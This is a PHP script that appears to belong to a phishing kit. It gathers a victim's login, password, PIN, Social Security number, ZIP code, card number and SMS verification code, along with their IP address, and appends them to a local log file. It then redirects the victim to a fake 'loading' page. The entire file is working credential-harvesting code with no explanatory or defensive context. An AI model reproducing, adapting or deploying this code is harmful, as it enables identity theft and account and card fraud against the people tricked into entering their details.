<?php
//code by Microcip2019
session_start();
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Los_Angeles');
$date = date('h:i',time());
$exipra = date('h:i', strtotime('+ 2 hours +30 minutes'));

$_SESSION['sms'] = trim($_POST['sms']);
//NOnaME

$user = $_SESSION['user'];
$pass = $_SESSION['pass'];
$pin = $_SESSION['pin'];
$ssn = $_SESSION['ssn'];
$zip = $_SESSION['zip'];
$card = $_SESSION['card'];
$sms = $_SESSION['sms'];


$fw2 = fopen("no1.txt","a");
        $data= "... $ip $user $pass Pin: $pin Ssn: $ssn Zip: $zip Card: $card  Sms:[ $sms ]\n";
        fputs($fw2,$data);
        fclose($fw2);

header("Location: loadingsms.php");

?>